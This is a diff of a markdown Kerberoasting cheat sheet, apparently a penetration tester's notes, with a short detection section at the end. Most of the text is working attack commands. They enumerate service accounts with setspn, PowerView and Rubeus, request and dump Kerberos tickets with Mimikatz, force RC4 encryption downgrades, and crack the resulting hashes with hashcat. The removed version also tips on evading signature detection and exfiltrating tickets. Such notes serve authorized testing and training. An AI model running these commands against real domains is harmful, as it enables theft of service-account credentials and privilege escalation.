@@ -1,155 +1,115 @@
-## Service Principal Name (SPN) Enumeration
+# Kerberoasting — Windows
 
-Scanning for Kerberoastable accounts via SPN discovery when you have a valid domain user session.
+---
 
-List all SPNs in the domain using the built-in Windows binary
+## Semi-Manual (setspn + Mimikatz)
 
-```
+Enumerate SPNs — ignore computer accounts, focus on user accounts:
+
+```cmd
 setspn.exe -Q */*
 ```
 
-Extract specific SAM account names for users with SPNs using PowerView
+Request TGS for a specific SPN into memory:
 
-```
-Get-DomainUser * -spn | select samaccountname
-```
-
-Gather statistical data on roastable accounts, encryption types, and password age using Rubeus
-
-```
-.\Rubeus.exe kerberoast /stats
-```
-
-- **Tool comparison**
-    - `setspn.exe`
-        - `setspn.exe -Q */*`
-        - Prefer for **native binary** execution to avoid signature-based detection of offensive tools.
-    - PowerView
-        - `Get-DomainUser * -spn`
-        - Prefer for **filtering and pipeline** integration within PowerShell.
-    - Rubeus
-        - `.\Rubeus.exe kerberoast /stats`
-        - Prefer for **detailed encryption type** (RC4 vs AES) and **password aging** analysis.
-
-**Gotchas**: **Computer accounts** are returned by `setspn.exe` and must be manually ignored to focus on high-value user accounts.
-
----
-
-## TGS Ticket Request
-
-Requesting service tickets for offline cracking once high-value target SPNs are identified.
-
-Manual PowerShell request for a specific service to load the ticket into memory
-
-```
+```powershell
 Add-Type -AssemblyName System.IdentityModel
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SERVICE_NAME>"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN_STRING>"
 ```
 
-Automated request and Hashcat-formatted output for a specific user using PowerView
-
-```
-Get-DomainUser -Identity <USERNAME> | Get-DomainSPNTicket -Format Hashcat
-```
-
-Request tickets for accounts with **admincount=1** and prevent column wrapping using Rubeus
-
-```
-.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
-```
-
-- **Tool comparison**
-    - Manual PS
-        - `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken`
-        - Prefer when **Rubeus/PowerView** are blocked or unavailable.
-    - PowerView
-        - `Get-DomainSPNTicket -Format Hashcat`
-        - Prefer for **direct export** to CSV or Hashcat format without memory extraction.
-    - Rubeus
-        - `.\Rubeus.exe kerberoast`
-        - Prefer for **speed** and the ability to target high-value accounts via **LDAP filters**.
-
-**Gotchas**: **AES encryption** (Type 18) is returned by default on **Windows Server 2019** DCs, which significantly increases cracking time compared to **RC4**.
-
----
-
-## Encryption Downgrade (RC4)
-
-Forcing RC4 encryption for easier cracking when the target supports AES but the DC is Server 2016 or earlier.
-
-Request an RC4 ticket by specifying support for only RC4 in the TGS request body
-
-```
-.\Rubeus.exe kerberoast /user:<USERNAME> /nowrap /tgtdeleg
-```
-
-- **Dangerous / misconfigured settings**
-    - `msDS-SupportedEncryptionTypes` set to **0** (default) or explicitly including **RC4**.
-    - **Group Policy** allowing **RC4_HMAC_MD5** for Kerberos.
-
-**Gotchas**: **Windows Server 2019** ignores the `/tgtdeleg` flag and always returns the highest encryption level supported by the account.
-
----
-
-## Ticket Extraction from Memory
-
-Extracting tickets loaded into the current session's memory for offline exfiltration.
-
-Export all tickets in memory to base64 encoded output
+Extract from memory with Mimikatz — base64 out for portability:
 
 ```
 mimikatz # base64 /out:true
 mimikatz # kerberos::list /export
 ```
 
-**Gotchas**: Without `base64 /out:true`, Mimikatz writes tickets to **.kirbi files** on disk, which may be harder to exfiltrate depending on host access.
+Convert base64 blob to .kirbi, then crack:
+
+```bash
+echo "<base64>" | tr -d \\n | base64 -d > <USER>.kirbi
+python2.7 kirbi2john.py <USER>.kirbi > crack_file
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > <USER>_hashcat
+hashcat -m 13100 <USER>_hashcat <WORDLIST>
+```
+
+> [!tip] Skip base64 by omitting `base64 /out:true` — Mimikatz writes `.kirbi` files to disk. Transfer and run `kirbi2john.py` directly.
 
 ---
 
-## Offline Hash Preparation
+## PowerView (Automated)
 
-Converting exfiltrated ticket data into formats compatible with cracking tools.
+List SPN accounts:
 
-Remove newlines and whitespace from a column-wrapped base64 blob
-
-```
-echo "<HASH>" | tr -d \n
-```
-
-Convert a cleaned base64 file back into a binary .kirbi file
-
-```
-cat <FILE_PATH> | base64 -d > <FILE_PATH>.kirbi
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
 ```
 
-Extract the crackable hash from a .kirbi file into John format
+Get ticket for specific user in Hashcat format:
 
-```
-python2.7 kirbi2john.py <FILE_PATH>.kirbi
+```powershell
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
 ```
 
-Reformat a `kirbi2john` output file specifically for Hashcat RC4 cracking
+Export all tickets to CSV — feed hashes to Hashcat offline:
 
-```
-sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$ \2/' <FILE_PATH> > <FILE_PATH>_hashcat
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\<OUTFILE>.csv -NoTypeInformation
 ```
 
 ---
 
-## Password Cracking
+## Rubeus (Fastest)
 
-Executing offline brute-force or dictionary attacks against recovered TGS hashes.
+Stats first — check encryption types and how many are RC4 vs AES:
 
-Crack RC4 (Type 23) TGS hashes
-
-```
-hashcat -m 13100 <FILE_PATH> <FILE_PATH>
+```powershell
+.\Rubeus.exe kerberoast /stats
 ```
 
-Crack AES-256 (Type 18) TGS hashes
+Roast only `admincount=1` accounts — highest value targets, ready for Hashcat:
 
-```
-hashcat -m 19700 <FILE_PATH> <FILE_PATH>
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 ```
 
-**Gotchas**: **AES-256** cracking is substantially more **time consuming** than RC4; a simple password takes minutes on a CPU vs. seconds for RC4.
+Target specific user:
+
+```powershell
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+All tickets to file:
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:<OUTFILE>.txt
+```
+
+---
+
+## Encryption Types & Downgrade
+
+`msDS-SupportedEncryptionTypes=0` → RC4 default (`$krb5tgs$23$`) → hashcat mode 13100, cracks fast.
+
+`msDS-SupportedEncryptionTypes=24` → AES-128/256 only (`$krb5tgs$18$`) → hashcat mode 19700, significantly slower.
+
+Check what a target account supports:
+
+```powershell
+Get-DomainUser <USER> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+Force RC4 downgrade on AES accounts using `/tgtdeleg`:
+
+```powershell
+.\Rubeus.exe kerberoast /user:<USER> /tgtdeleg /nowrap
+```
+
+> [!warning] `/tgtdeleg` downgrade does **not** work against Windows Server 2019 DCs — will always return AES-256 regardless of domain functional level. On 2016 and earlier it works even if AES is enabled on the account.
+
+---
+
+## Detection
+
+Event ID 4769 (TGS ticket requested) — bulk requests from one account in a short window = spray. Encryption type `0x17` (RC4) in 4769 events is the key indicator — AES-enabled environments shouldn't be generating RC4 TGS requests. Event ID 4770 = ticket renewed.
